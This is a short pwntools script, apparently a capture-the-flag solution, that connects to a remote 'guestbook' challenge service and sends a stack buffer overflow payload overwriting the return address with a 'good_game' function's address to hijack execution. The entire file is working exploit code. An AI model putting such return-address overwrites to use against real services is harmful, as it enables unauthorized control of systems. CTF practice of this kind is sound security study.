from pwn import *
from LibcSearcher import *
p=remote('pwn.jarvisoj.com',9876)
#p=process('./guestbook')
#gdb.attach(p)
e=ELF('./guestbook')
good_game=e.symbols['good_game']
payload='a'*(0x88)+p64(good_game)
p.sendlineafter("Input your message:\n",payload)
p.interactive()
